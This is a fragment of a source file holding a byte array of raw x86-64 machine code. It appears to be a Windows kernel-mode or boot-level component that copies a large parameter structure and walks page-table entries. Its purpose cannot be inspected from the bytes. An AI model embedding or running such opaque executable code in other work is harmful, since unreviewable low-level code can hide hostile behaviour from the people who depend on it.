    0x00, 0x48, 0x8D, 0x15, 0x3E, 0xBF, 0x00, 0x00, 0x48, 0x8D, 0x3D, 0xFC, 0xA5, 0x00, 0x00, 0x49,
    0x89, 0xF8, 0xFF, 0x15, 0x10, 0xD4, 0x00, 0x00, 0x4C, 0x8B, 0x0D, 0x99, 0xD2, 0x00, 0x00, 0x48,
    0x8D, 0x0D, 0xFD, 0xC7, 0x00, 0x00, 0x48, 0x8D, 0x1D, 0x27, 0xBF, 0x00, 0x00, 0x48, 0x89, 0xDA,
    0x49, 0x89, 0xF8, 0xFF, 0x15, 0xEF, 0xD3, 0x00, 0x00, 0x4C, 0x8B, 0x0D, 0x70, 0xD2, 0x00, 0x00,
    0x48, 0x8D, 0x0D, 0xB9, 0xC7, 0x00, 0x00, 0x48, 0x89, 0xDA, 0x49, 0x89, 0xF8, 0xFF, 0x15, 0xD5,
    0xD3, 0x00, 0x00, 0x4C, 0x8B, 0x0D, 0x56, 0xD2, 0x00, 0x00, 0x4C, 0x2B, 0x0D, 0x57, 0xD2, 0x00,
    0x00, 0x49, 0xFF, 0xC1, 0x48, 0x8D, 0x0D, 0x72, 0xC7, 0x00, 0x00, 0x48, 0x89, 0xDA, 0x49, 0x89,
    0xF8, 0xFF, 0x15, 0xB1, 0xD3, 0x00, 0x00, 0x31, 0xFF, 0x48, 0x89, 0xF1, 0x31, 0xD2, 0xFF, 0x15,
    0xD4, 0xD2, 0x00, 0x00, 0xEB, 0x20, 0x48, 0x8D, 0x0D, 0xB9, 0xC7, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0xBA, 0xBE, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x70, 0xA5, 0x00, 0x00, 0xFF, 0x15, 0x87, 0xD3, 0x00,
    0x00, 0xBF, 0x01, 0x00, 0x00, 0xC0, 0x89, 0xF8, 0x48, 0x83, 0xC4, 0x48, 0x5B, 0x5D, 0x5F, 0x5E,
    0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E, 0x41, 0x5F, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x8D, 0x0D, 0xD9, 0x9F, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x82, 0xBE,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0xE8, 0xAA, 0x00, 0x00, 0xFF, 0x15, 0x49, 0xD3, 0x00, 0x00, 0x44,
    0x8B, 0x0D, 0x42, 0xD4, 0x00, 0x00, 0x41, 0x8D, 0x81, 0x9F, 0xB5, 0xFF, 0xFF, 0x3D, 0x8F, 0x0B,
    0x00, 0x00, 0x77, 0x23, 0x48, 0x8D, 0x0D, 0x79, 0xC2, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x52, 0xBE,
    0x00, 0x00, 0x4C, 0x8D, 0x05, 0xB8, 0xAA, 0x00, 0x00, 0xFF, 0x15, 0x19, 0xD3, 0x00, 0x00, 0x41,
    0xB9, 0x10, 0x1B, 0x00, 0x00, 0xEB, 0x5C, 0x41, 0x8D, 0x81, 0xA3, 0xA7, 0xFF, 0xFF, 0x83, 0xF8,
    0x0A, 0x77, 0x23, 0x48, 0x8D, 0x0D, 0xBB, 0xC1, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x23, 0xBE, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x89, 0xAA, 0x00, 0x00, 0xFF, 0x15, 0xEA, 0xD2, 0x00, 0x00, 0x41, 0xB9,
    0x90, 0x42, 0x00, 0x00, 0xEB, 0x2D, 0x48, 0x8B, 0x05, 0xDB, 0xD2, 0x00, 0x00, 0x41, 0x81, 0xF9,
    0xF4, 0x65, 0x00, 0x00, 0x72, 0x51, 0x48, 0x8D, 0x0D, 0xD2, 0xC1, 0x00, 0x00, 0x48, 0x8D, 0x15,
    0xF0, 0xBD, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x56, 0xAA, 0x00, 0x00, 0xFF, 0xD0, 0x41, 0xB9, 0x50,
    0x48, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x1E, 0xD3, 0x00, 0x00, 0x44, 0x89, 0xC9, 0x48, 0xC7, 0x04,
    0x08, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x0E, 0xC7, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xC1,
    0xBD, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x27, 0xAA, 0x00, 0x00, 0xFF, 0x15, 0x88, 0xD2, 0x00, 0x00,
    0x31, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0x48, 0x8D, 0x0D, 0x04, 0xC6, 0x00, 0x00, 0x48, 0x8D,
    0x15, 0x99, 0xBD, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x05, 0xAA, 0x00, 0x00, 0xFF, 0xD0, 0xB8, 0xBB,
    0x00, 0x00, 0xC0, 0xEB, 0xDD, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x56, 0x57, 0x48, 0x83, 0xEC, 0x38, 0xBE, 0x25, 0x02, 0x00, 0xC0, 0x80, 0x3D, 0x4A, 0xD3, 0x00,
    0x00, 0x00, 0x0F, 0x85, 0x70, 0x07, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x08, 0x48, 0x89, 0x05, 0xB5,
    0xCF, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x10, 0x48, 0x89, 0x05, 0xB2, 0xCF, 0x00, 0x00, 0x48, 0x8B,
    0x81, 0xB0, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0x1C, 0xD2, 0x00, 0x00, 0x48, 0x8B, 0x01, 0x48,
    0x89, 0x05, 0x7A, 0xCF, 0x00, 0x00, 0x8B, 0x41, 0x18, 0x89, 0x05, 0x79, 0xCF, 0x00, 0x00, 0x8B,
    0x41, 0x1C, 0x89, 0x05, 0x74, 0xCF, 0x00, 0x00, 0x8B, 0x41, 0x20, 0x89, 0x05, 0x6F, 0xCF, 0x00,
    0x00, 0x48, 0x8B, 0x41, 0x28, 0x48, 0x89, 0x05, 0x1C, 0xD0, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x30,
    0x48, 0x89, 0x05, 0x41, 0xD2, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x38, 0x48, 0x89, 0x05, 0x7E, 0xCF,
    0x00, 0x00, 0x48, 0x8B, 0x41, 0x40, 0x48, 0x89, 0x05, 0x83, 0xCF, 0x00, 0x00, 0x48, 0x8B, 0x41,
    0x48, 0x48, 0x89, 0x05, 0x80, 0xCF, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x50, 0x48, 0x89, 0x05, 0xED,
    0xCF, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x58, 0x48, 0x89, 0x05, 0x5A, 0xCF, 0x00, 0x00, 0x48, 0x8B,
    0x41, 0x60, 0x48, 0x89, 0x05, 0xDF, 0xCF, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x68, 0x48, 0x89, 0x05,
    0xDC, 0xCF, 0x00, 0x00, 0x48, 0x8B, 0x41, 0x70, 0x48, 0x89, 0x05, 0xD9, 0xCF, 0x00, 0x00, 0x48,
    0x8B, 0x41, 0x78, 0x48, 0x89, 0x05, 0xD6, 0xCF, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x80, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x05, 0xD0, 0xCF, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x88, 0x00, 0x00, 0x00, 0x48,
    0x89, 0x05, 0xCA, 0xCF, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x90, 0x00, 0x00, 0x00, 0x48, 0x89, 0x05,
    0xC4, 0xCF, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x98, 0x00, 0x00, 0x00, 0x48, 0x89, 0x05, 0xBE, 0xCF,
    0x00, 0x00, 0x48, 0x8B, 0x81, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x05, 0xB8, 0xCF, 0x00, 0x00,
    0x48, 0x8B, 0x81, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x05, 0x92, 0xD1, 0x00, 0x00, 0x48, 0x8B,
    0x81, 0xB0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x05, 0xE4, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xB8,
    0x00, 0x00, 0x00, 0x48, 0x89, 0x05, 0xDE, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xC0, 0x00, 0x00,
    0x00, 0x48, 0x89, 0x05, 0xD8, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xC8, 0x00, 0x00, 0x00, 0x48,
    0x89, 0x05, 0xD2, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xD0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x05,
    0xCC, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xD8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x05, 0xC6, 0xCE,
    0x00, 0x00, 0x48, 0x8B, 0x81, 0x00, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xC0, 0xCE, 0x00, 0x00,
    0x48, 0x8B, 0x81, 0x08, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xBA, 0xCE, 0x00, 0x00, 0x48, 0x8B,
    0x81, 0x10, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xB4, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x20,
    0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xAE, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x28, 0x01, 0x00,
    0x00, 0x48, 0x89, 0x05, 0xA8, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x30, 0x01, 0x00, 0x00, 0x48,
    0x89, 0x05, 0xA2, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xE0, 0x00, 0x00, 0x00, 0x48, 0x89, 0x05,
    0xE4, 0xD0, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x38, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0x8E, 0xCE,
    0x00, 0x00, 0x48, 0x8B, 0x81, 0x40, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xF0, 0xCE, 0x00, 0x00,
    0x48, 0x8B, 0x81, 0x48, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xEA, 0xCE, 0x00, 0x00, 0x48, 0x8B,
    0x81, 0x50, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xE4, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x58,
    0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xDE, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x60, 0x01, 0x00,
    0x00, 0x48, 0x8B, 0x91, 0x68, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xD1, 0xCE, 0x00, 0x00, 0x48,
    0x89, 0x15, 0xD2, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x70, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05,
    0xCC, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x78, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xC6, 0xCE,
    0x00, 0x00, 0x48, 0x8B, 0x81, 0x80, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xC0, 0xCE, 0x00, 0x00,
    0x48, 0x8B, 0x81, 0x88, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xBA, 0xCE, 0x00, 0x00, 0x48, 0x8B,
    0x81, 0x90, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xB4, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x98,
    0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0xAE, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xA0, 0x01, 0x00,
    0x00, 0x48, 0x89, 0x05, 0xA8, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xA8, 0x01, 0x00, 0x00, 0x48,
    0x89, 0x05, 0xA2, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xB0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05,
    0x9C, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xB8, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0x96, 0xCE,
    0x00, 0x00, 0x48, 0x8B, 0x81, 0xC0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0x90, 0xCE, 0x00, 0x00,
    0x48, 0x8B, 0x81, 0xC8, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0x8A, 0xCE, 0x00, 0x00, 0x48, 0x8B,
    0x81, 0xD0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0x84, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xD8,
    0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0x7E, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xE0, 0x01, 0x00,
    0x00, 0x48, 0x89, 0x05, 0x78, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xE8, 0x01, 0x00, 0x00, 0x48,
    0x89, 0x05, 0x72, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xF0, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05,
    0x6C, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xF8, 0x01, 0x00, 0x00, 0x48, 0x89, 0x05, 0x66, 0xCE,
    0x00, 0x00, 0x48, 0x8B, 0x81, 0x00, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0x90, 0xCE, 0x00, 0x00,
    0x48, 0x8B, 0x81, 0x08, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0x8A, 0xCE, 0x00, 0x00, 0x48, 0x8B,
    0x81, 0x10, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0x7C, 0xCC, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x18,
    0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0x36, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x28, 0x02, 0x00,
    0x00, 0x48, 0x89, 0x05, 0x30, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x30, 0x02, 0x00, 0x00, 0x48,
    0x89, 0x05, 0x2A, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x38, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05,
    0x24, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x40, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0x1E, 0xCE,
    0x00, 0x00, 0x48, 0x8B, 0x81, 0x48, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0x18, 0xCE, 0x00, 0x00,
    0x48, 0x8B, 0x81, 0x20, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0x22, 0xCE, 0x00, 0x00, 0x48, 0x8B,
    0x81, 0x50, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0x1C, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x58,
    0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0x16, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x60, 0x02, 0x00,
    0x00, 0x48, 0x89, 0x05, 0x10, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x68, 0x02, 0x00, 0x00, 0x48,
    0x89, 0x05, 0x0A, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x70, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05,
    0x04, 0xCE, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x78, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0xFE, 0xCD,
    0x00, 0x00, 0x48, 0x8B, 0x81, 0x80, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0xF8, 0xCD, 0x00, 0x00,
    0x48, 0x8B, 0x81, 0x88, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0xF2, 0xCD, 0x00, 0x00, 0x48, 0x8B,
    0x81, 0x90, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0xEC, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x98,
    0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0xE6, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xA0, 0x02, 0x00,
    0x00, 0x48, 0x89, 0x05, 0xE0, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xA8, 0x02, 0x00, 0x00, 0x48,
    0x89, 0x05, 0xDA, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xB8, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05,
    0xDC, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xC0, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0xD6, 0xCD,
    0x00, 0x00, 0x48, 0x8B, 0x81, 0xC8, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0xD0, 0xCD, 0x00, 0x00,
    0x48, 0x8B, 0x81, 0xD0, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0xCA, 0xCD, 0x00, 0x00, 0x48, 0x8B,
    0x81, 0xD8, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0xC4, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xE0,
    0x02, 0x00, 0x00, 0x48, 0x89, 0x05, 0xBE, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xE8, 0x02, 0x00,
    0x00, 0x48, 0x89, 0x05, 0xB8, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xF0, 0x02, 0x00, 0x00, 0x48,
    0x89, 0x05, 0xB2, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0xF8, 0x02, 0x00, 0x00, 0x48, 0x89, 0x05,
    0xAC, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x00, 0x03, 0x00, 0x00, 0x48, 0x89, 0x05, 0xA6, 0xCD,
    0x00, 0x00, 0x48, 0x8B, 0x81, 0x08, 0x03, 0x00, 0x00, 0x48, 0x89, 0x05, 0x00, 0xCE, 0x00, 0x00,
    0x48, 0x8B, 0x81, 0x10, 0x03, 0x00, 0x00, 0x48, 0x89, 0x05, 0xFA, 0xCD, 0x00, 0x00, 0x48, 0x8B,
    0x81, 0x18, 0x03, 0x00, 0x00, 0x48, 0x89, 0x05, 0xF4, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x20,
    0x03, 0x00, 0x00, 0x48, 0x89, 0x05, 0xEE, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x28, 0x03, 0x00,
    0x00, 0x48, 0x89, 0x05, 0xE8, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x30, 0x03, 0x00, 0x00, 0x48,
    0x89, 0x05, 0xE2, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x38, 0x03, 0x00, 0x00, 0x48, 0x89, 0x05,
    0xDC, 0xCD, 0x00, 0x00, 0x48, 0x8B, 0x81, 0x40, 0x03, 0x00, 0x00, 0x48, 0x89, 0x05, 0xD6, 0xCD,
    0x00, 0x00, 0x48, 0x8B, 0x15, 0x47, 0xCA, 0x00, 0x00, 0x48, 0x89, 0x54, 0x24, 0x20, 0x4C, 0x8D,
    0x05, 0xD8, 0xB8, 0x00, 0x00, 0x4C, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8,
    0x0C, 0x08, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x85, 0xC0, 0x74, 0x1A, 0x48, 0x63,
    0x48, 0x03, 0x48, 0x01, 0xC1, 0x48, 0x83, 0xC1, 0x07, 0x48, 0x89, 0x0D, 0xF8, 0xC9, 0x00, 0x00,
    0x0F, 0x85, 0xD8, 0x00, 0x00, 0x00, 0xEB, 0x0B, 0x48, 0xC7, 0x05, 0xE5, 0xC9, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x1A, 0xBB, 0x00, 0x00, 0x48, 0x8D, 0x15, 0xAD, 0xB7, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0xFA, 0x99, 0x00, 0x00, 0xFF, 0x15, 0x7A, 0xCC, 0x00, 0x00, 0x48, 0x8B,
    0x15, 0xDB, 0xC9, 0x00, 0x00, 0x48, 0x89, 0x54, 0x24, 0x20, 0x4C, 0x8D, 0x05, 0x9F, 0xB8, 0x00,
    0x00, 0x4C, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0xA0, 0x07, 0x00, 0x00,
    0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x85, 0xC0, 0x74, 0x16, 0x48, 0x63, 0x48, 0x03, 0x48, 0x01,
    0xC1, 0x48, 0x83, 0xC1, 0x07, 0x48, 0x89, 0x0D, 0x8C, 0xC9, 0x00, 0x00, 0x75, 0x70, 0xEB, 0x0B,
    0x48, 0xC7, 0x05, 0x7D, 0xC9, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x81, 0xBA,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0x45, 0xB7, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x92, 0x99, 0x00, 0x00,
    0xFF, 0x15, 0x12, 0xCC, 0x00, 0x00, 0x48, 0x8B, 0x15, 0x73, 0xC9, 0x00, 0x00, 0x48, 0x89, 0x54,
    0x24, 0x20, 0x4C, 0x8D, 0x05, 0xD1, 0xB8, 0x00, 0x00, 0x4C, 0x89, 0x44, 0x24, 0x28, 0x48, 0x8D,
    0x4C, 0x24, 0x20, 0xE8, 0x38, 0x07, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x30, 0x48, 0x85, 0xC0,
    0x0F, 0x84, 0xEC, 0x00, 0x00, 0x00, 0x48, 0x63, 0x48, 0x03, 0x48, 0x01, 0xC1, 0x48, 0x83, 0xC1,
    0x07, 0x48, 0x89, 0x0D, 0x20, 0xC9, 0x00, 0x00, 0x0F, 0x84, 0xDF, 0x00, 0x00, 0x00, 0xE8, 0x0D,
    0x75, 0x00, 0x00, 0x89, 0x05, 0xBF, 0xCC, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x64, 0xC1, 0x00, 0x00,
    0x48, 0x8D, 0x74, 0x24, 0x20, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x52, 0xCB, 0x00, 0x00, 0x48, 0x89,
    0xF1, 0xFF, 0x15, 0x09, 0xCA, 0x00, 0x00, 0x48, 0x89, 0x05, 0x32, 0xC9, 0x00, 0x00, 0xBF, 0x25,
    0x02, 0x00, 0xC0, 0x48, 0x85, 0xC0, 0x74, 0x72, 0x48, 0x8D, 0x15, 0xDF, 0xC0, 0x00, 0x00, 0x48,
    0x8D, 0x74, 0x24, 0x20, 0x48, 0x89, 0xF1, 0xFF, 0x15, 0x23, 0xCB, 0x00, 0x00, 0x48, 0x89, 0xF1,
    0xFF, 0x15, 0xDA, 0xC9, 0x00, 0x00, 0x48, 0x89, 0x05, 0x0B, 0xC9, 0x00, 0x00, 0x48, 0x85, 0xC0,
    0x74, 0x51, 0x31, 0xF6, 0x80, 0x3D, 0x61, 0xCC, 0x00, 0x00, 0x00, 0x0F, 0x85, 0x87, 0x00, 0x00,
    0x00, 0xC6, 0x05, 0x54, 0xCC, 0x00, 0x00, 0x01, 0xE8, 0x63, 0xF6, 0xFF, 0xFF, 0xBF, 0x9A, 0x00,
    0x00, 0xC0, 0x85, 0xC0, 0x78, 0x7B, 0x83, 0x3D, 0xB3, 0xC8, 0x00, 0x00, 0x01, 0x75, 0x09, 0xE8,
    0xCC, 0xF7, 0xFF, 0xFF, 0x85, 0xC0, 0x78, 0x72, 0xE8, 0xB3, 0x64, 0x00, 0x00, 0x85, 0xC0, 0x79,
    0x57, 0x48, 0x8D, 0x0D, 0x58, 0xB0, 0x00, 0x00, 0xEB, 0x10, 0x48, 0x8D, 0x0D, 0x82, 0xB0, 0x00,
    0x00, 0xEB, 0x07, 0x48, 0x8D, 0x0D, 0xB9, 0x9C, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x2D, 0xB6, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x7A, 0x98, 0x00, 0x00, 0xFF, 0x15, 0xFA, 0xCA, 0x00, 0x00, 0x89, 0xFE,
    0xEB, 0x26, 0x48, 0xC7, 0x05, 0x3B, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D,
    0x0E, 0xB9, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x03, 0xB6, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x50, 0x98,
    0x00, 0x00, 0xFF, 0x15, 0xD0, 0xCA, 0x00, 0x00, 0x89, 0xF0, 0x48, 0x83, 0xC4, 0x38, 0x5F, 0x5E,
    0xC3, 0x48, 0x8D, 0x0D, 0xC5, 0x9C, 0x00, 0x00, 0xEB, 0xB0, 0x48, 0x8D, 0x0D, 0x35, 0xAC, 0x00,
    0x00, 0xEB, 0xA7, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x41, 0x57, 0x41, 0x56, 0x41, 0x55, 0x41, 0x54, 0x56, 0x57, 0x55, 0x53, 0x48, 0x83, 0xEC, 0x58,
    0x48, 0x89, 0xD6, 0x48, 0x89, 0xCF, 0x48, 0x89, 0x54, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x64, 0x8A,
    0x00, 0x00, 0x48, 0x8D, 0x15, 0xAB, 0xB5, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xC6, 0x9C, 0x00, 0x00,
    0x49, 0x89, 0xF9, 0xFF, 0x15, 0x6F, 0xCA, 0x00, 0x00, 0xFF, 0x15, 0x79, 0xC9, 0x00, 0x00, 0x48,
    0x89, 0xC1, 0xE8, 0x99, 0x68, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x27, 0x48, 0x01, 0xFE, 0x31,
    0xDB, 0x48, 0x39, 0xFE, 0x76, 0x3F, 0x49, 0x89, 0xC6, 0x49, 0xBD, 0x00, 0xF0, 0xFF, 0xFF, 0xFF,
    0xFF, 0x00, 0x00, 0x4C, 0x8D, 0x64, 0x24, 0x48, 0x45, 0x31, 0xFF, 0x48, 0x89, 0xFD, 0xE9, 0x99,
    0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x45, 0x98, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x4D, 0xB5, 0x00,
    0x00, 0x4C, 0x8D, 0x05, 0x6E, 0x9C, 0x00, 0x00, 0xFF, 0x15, 0x1A, 0xCA, 0x00, 0x00, 0xBB, 0x01,
    0x00, 0x00, 0xC0, 0xEB, 0x2B, 0x45, 0x31, 0xFF, 0x48, 0x89, 0x74, 0x24, 0x28, 0x48, 0x89, 0x7C,
    0x24, 0x20, 0x48, 0x8D, 0x0D, 0x6E, 0x87, 0x00, 0x00, 0x48, 0x8D, 0x15, 0x24, 0xB5, 0x00, 0x00,
    0x4C, 0x8D, 0x05, 0x3F, 0x9C, 0x00, 0x00, 0x4D, 0x89, 0xF9, 0xFF, 0x15, 0xE8, 0xC9, 0x00, 0x00,
    0x89, 0xD8, 0x48, 0x83, 0xC4, 0x58, 0x5B, 0x5D, 0x5F, 0x5E, 0x41, 0x5C, 0x41, 0x5D, 0x41, 0x5E,
    0x41, 0x5F, 0xC3, 0x48, 0x89, 0x6C, 0x24, 0x20, 0x48, 0x8D, 0x0D, 0x10, 0x8B, 0x00, 0x00, 0x48,
    0x8D, 0x15, 0xFE, 0xB4, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0x09, 0x9C, 0x00, 0x00, 0x49, 0x89, 0xD9,
    0x41, 0xFF, 0xD2, 0x49, 0xFF, 0xC7, 0x31, 0xDB, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x48, 0x81, 0xC5, 0x00, 0x10, 0x00, 0x00, 0x48, 0x39, 0xF5, 0x73, 0x8C, 0x48, 0xC7, 0x44, 0x24,
    0x48, 0x00, 0x00, 0x00, 0x00, 0x48, 0x89, 0xE9, 0x48, 0xC1, 0xE9, 0x24, 0x81, 0xE1, 0xF8, 0x0F,
    0x00, 0x00, 0x4C, 0x01, 0xF1, 0x41, 0xB8, 0x08, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xE2, 0x45, 0x31,
    0xC9, 0xE8, 0xFA, 0x63, 0x00, 0x00, 0x85, 0xC0, 0x78, 0xC6, 0x48, 0x8B, 0x44, 0x24, 0x48, 0xA8,
    0x01, 0x74, 0xBD, 0x48, 0xC7, 0x44, 0x24, 0x40, 0x00, 0x00, 0x00, 0x00, 0x4C, 0x21, 0xE8, 0x48,
    0x89, 0xE9, 0x48, 0xC1, 0xE9, 0x1B, 0x81, 0xE1, 0xF8, 0x0F, 0x00, 0x00, 0x48, 0x09, 0xC1, 0x41,
